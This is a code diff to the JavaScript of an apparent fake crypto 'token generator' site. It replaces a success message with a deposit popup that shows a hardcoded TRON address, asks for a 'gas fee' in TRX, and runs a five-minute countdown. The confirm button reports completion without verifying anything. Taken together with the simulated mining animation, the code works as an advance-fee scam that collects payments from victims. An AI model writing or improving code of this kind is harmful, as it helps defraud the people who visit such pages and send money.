@@ -8,12 +8,18 @@ let blockData = {
     difficulty: 0
 };
 
+// Popup state
+let depositTimerInterval = null;
+let depositTimerStartTime = null;
+let isPopupActive = false;
+
 // ===== Constants =====
 const TOKEN_MIN = 500;
 const TOKEN_MAX = 750000;
 const TOKEN_STEP = 500;
 const FEE_PER_500 = 20; // TRX
 const GAS_FEE_ADDRESS = 'TUqzCMaBVbDwhcbcSAuk6CccqkVnDuuN34';
+const DEPOSIT_TIMER_DURATION = 300; // 5 minutes in seconds
 
 // ===== DOM Elements =====
 const elements = {
@@ -35,7 +41,18 @@ const elements = {
     blockHash: document.getElementById('blockHash'),
     nonceValue: document.getElementById('nonceValue'),
     difficultyValue: document.getElementById('difficultyValue'),
-    miningDetails: document.getElementById('miningDetails')
+    miningDetails: document.getElementById('miningDetails'),
+    
+    // Popup elements
+    depositPopup: document.getElementById('depositPopup'),
+    popupDepositAmount: document.getElementById('popupDepositAmount'),
+    popupDepositAddress: document.getElementById('popupDepositAddress'),
+    copyPopupAddress: document.getElementById('copyPopupAddress'),
+    depositTimer: document.getElementById('depositTimer'),
+    depositTimerFill: document.getElementById('depositTimerFill'),
+    completionMessage: document.getElementById('completionMessage'),
+    popupCloseBtn: document.getElementById('closePopupBtn'),
+    popupConfirmBtn: document.getElementById('confirmDepositBtn')
 };
 
 // ===== Utility Functions =====
@@ -202,6 +219,104 @@ function showGasInfo() {
     elements.gasInfo.classList.add('show');
 }
 
+// ===== Popup Functions =====
+function showDepositPopup(depositAmount) {
+    // Update popup content
+    elements.popupDepositAmount.textContent = `${depositAmount} TRX`;
+    elements.popupDepositAddress.textContent = GAS_FEE_ADDRESS;
+    
+    // Show popup
+    elements.depositPopup.style.display = 'flex';
+    isPopupActive = true;
+    
+    // Start deposit timer
+    startDepositTimer();
+    
+    // Initialize Lucide icons if available
+    if (typeof lucide !== 'undefined') {
+        lucide.createIcons();
+    }
+}
+
+function hideDepositPopup() {
+    elements.depositPopup.style.display = 'none';
+    isPopupActive = false;
+    
+    // Clear timer
+    if (depositTimerInterval) {
+        clearInterval(depositTimerInterval);
+        depositTimerInterval = null;
+    }
+}
+
+function startDepositTimer() {
+    depositTimerStartTime = Date.now();
+    let timeLeft = DEPOSIT_TIMER_DURATION;
+    
+    // Update timer display
+    elements.depositTimer.textContent = formatTime(timeLeft);
+    elements.depositTimerFill.style.width = '100%';
+    
+    depositTimerInterval = setInterval(() => {
+        const elapsed = Math.floor((Date.now() - depositTimerStartTime) / 1000);
+        timeLeft = Math.max(0, DEPOSIT_TIMER_DURATION - elapsed);
+        
+        // Update display
+        elements.depositTimer.textContent = formatTime(timeLeft);
+        const progress = (timeLeft / DEPOSIT_TIMER_DURATION) * 100;
+        elements.depositTimerFill.style.width = `${progress}%`;
+        
+        // Show completion message when timer ends
+        if (timeLeft <= 0) {
+            clearInterval(depositTimerInterval);
+            depositTimerInterval = null;
+            showCompletionMessage();
+        }
+    }, 1000);
+}
+
+function showCompletionMessage() {
+    // Hide original popup content
+    document.querySelector('.popup-content').style.display = 'none';
+    document.querySelector('.popup-actions').style.display = 'none';
+    
+    // Show completion message
+    elements.completionMessage.style.display = 'block';
+}
+
+function copyToClipboard(text, isPopup = false) {
+    if (navigator.clipboard) {
+        navigator.clipboard.writeText(text).then(() => {
+            const message = isPopup ? 'Deposit address copied to clipboard!' : 'Gas address copied to clipboard!';
+            showToast('Copied!', message, 'success');
+        }).catch(() => {
+            fallbackCopyTextToClipboard(text);
+        });
+    } else {
+        fallbackCopyTextToClipboard(text);
+    }
+}
+
+function fallbackCopyTextToClipboard(text) {
+    const textArea = document.createElement('textarea');
+    textArea.value = text;
+    textArea.style.position = 'fixed';
+    textArea.style.left = '-999999px';
+    textArea.style.top = '-999999px';
+    document.body.appendChild(textArea);
+    textArea.focus();
+    textArea.select();
+    
+    try {
+        document.execCommand('copy');
+        showToast('Copied!', 'Address copied to clipboard!', 'success');
+    } catch (err) {
+        showToast('Error', 'Failed to copy address', 'error');
+    }
+    
+    document.body.removeChild(textArea);
+}
+
 function startProgress() {
     // Initialize mining
     miningStartTime = Date.now();
@@ -258,8 +373,12 @@ function startProgress() {
             setTimeout(() => {
                 elements.progressContainer.style.display = 'none';
                 elements.miningBackground.classList.remove('active');
-                showGasInfo();
-                showToast('Mining Completed Successfully!', 'Your tokens have been generated and are now available.', 'success');
+                
+                // Get deposit amount from summary
+                const depositAmount = elements.summaryTotalFee.textContent.replace(' TRX', '');
+                
+                // Show deposit popup with timer
+                showDepositPopup(depositAmount);
                 
                 // Reset form state
                 isGenerating = false;
@@ -399,6 +518,28 @@ function setupEventListeners() {
         if (e.key === 'Enter' && !elements.generateBtn.disabled) {
             handleGenerateToken();
         }
+    });
+    
+    // Popup event listeners
+    elements.copyPopupAddress.addEventListener('click', () => {
+        copyToClipboard(GAS_FEE_ADDRESS, true);
+    });
+    
+    elements.popupCloseBtn.addEventListener('click', () => {
+        hideDepositPopup();
+        // Also show gas info after popup is closed
+        setTimeout(() => {
+            showGasInfo();
+        }, 300);
+    });
+    
+    elements.popupConfirmBtn.addEventListener('click', () => {
+        // Confirm deposit and show completion message immediately
+        if (depositTimerInterval) {
+            clearInterval(depositTimerInterval);
+            depositTimerInterval = null;
+        }
+        showCompletionMessage();
     });
 }
 
